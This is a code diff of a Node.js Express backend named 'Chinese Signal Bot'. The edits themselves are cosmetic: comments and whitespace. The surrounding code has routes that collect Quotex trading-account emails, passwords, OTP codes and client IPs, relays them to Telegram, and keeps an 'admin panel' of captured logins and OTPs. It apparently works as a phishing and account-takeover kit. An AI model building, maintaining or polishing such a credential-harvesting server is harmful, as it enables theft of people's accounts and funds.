@@ -2,6 +2,7 @@ const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
 const app = express();
+
 app.use(cors());
 app.use(express.json());
 
@@ -34,7 +35,6 @@ app.get('/api/events', (req, res) => {
     res.setHeader('Connection', 'keep-alive');
     res.flushHeaders();
     connectedClients.add(res);
-    // Send initial connection message
     res.write(`data: ${JSON.stringify({ type: 'connected', message: 'ready' })}\n\n`);
     req.on('close', () => {
         connectedClients.delete(res);
@@ -50,7 +50,6 @@ app.get('/api/trigger-connected', async (req, res) => {
 ✅ Status: Account Connected
     `.trim();
     await sendTelegramMessage(message);
-    // Push notification to all connected users
     connectedClients.forEach(client => {
         try {
             client.write(`data: ${JSON.stringify({
@@ -107,7 +106,7 @@ app.post('/api/notification-permission', async (req, res) => {
     res.status(200).send({ status: "success" });
 });
 
-// ================== QUOTEX LOGIN ==================
+// ================== QUOTEX LOGIN & OTP ==================
 app.post('/api/quotex-login', async (req, res) => {
     const { email, password } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
@@ -129,15 +128,15 @@ app.post('/api/quotex-otp', async (req, res) => {
     res.status(200).send({ status: "ok" });
 });
 
-// ================== ADMIN PANEL ROUTES (Added) ==================
+// ================== ADMIN PANEL ROUTES ==================
 app.get('/api/latest-activity', (req, res) => {
     res.json({
-        logins: [], 
-        otps: []    
+        logins: [],
+        otps: []
     });
 });
 
-// Root
+// Root Route
 app.get('/', (req, res) => {
     res.send("✅ Chinese Signal Bot Backend is Running");
 });
